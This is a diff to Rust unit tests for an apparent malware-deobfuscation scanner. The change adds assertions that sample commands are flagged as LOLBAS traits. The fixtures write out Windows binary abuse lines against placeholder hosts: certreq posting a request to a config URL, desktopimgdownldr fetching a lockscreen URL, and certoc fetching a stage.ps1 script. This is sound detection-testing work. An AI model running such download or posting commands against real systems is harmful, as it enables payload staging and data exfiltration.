@@ -18881,10 +18881,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn certreq_config_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certreq-deob.example/submit";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"certreq -Post -config "{url}" request.req response.txt"#),
-            &mut env,
-        );
+        let line = format!(r#"certreq -Post -config "{url}" request.req response.txt"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -18893,6 +18891,13 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 )
             }),
             "certreq config URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certreq" && cmd == &line)
+            ),
+            "certreq config URL not marked as LOLBAS in deob text: {:?}",
             env.traits
         );
         assert!(
@@ -18935,10 +18940,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn desktopimgdownldr_lockscreenurl_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://desktopimg-deob.example/a.jpg";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"desktopimgdownldr.exe /lockscreenurl:{url} /eventName:test"#),
-            &mut env,
-        );
+        let line = format!(r#"desktopimgdownldr.exe /lockscreenurl:{url} /eventName:test"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -18947,6 +18950,13 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 )
             }),
             "desktopimgdownldr lockscreen URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "desktopimgdownldr" && cmd == &line)
+            ),
+            "desktopimgdownldr lockscreen URL not marked as LOLBAS in deob text: {:?}",
             env.traits
         );
         assert!(
@@ -18962,7 +18972,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn certoc_getcacaps_url_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certoc-deob.example/stage.ps1";
-        crate::deob_scan::scan_deob_text(&format!(r#"certoc.exe -GetCACAPS "{url}""#), &mut env);
+        let line = format!(r#"certoc.exe -GetCACAPS "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -18971,6 +18982,13 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 )
             }),
             "certoc GetCACAPS URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certoc" && cmd == &line)
+            ),
+            "certoc GetCACAPS URL not marked as LOLBAS in deob text: {:?}",
             env.traits
         );
         assert!(
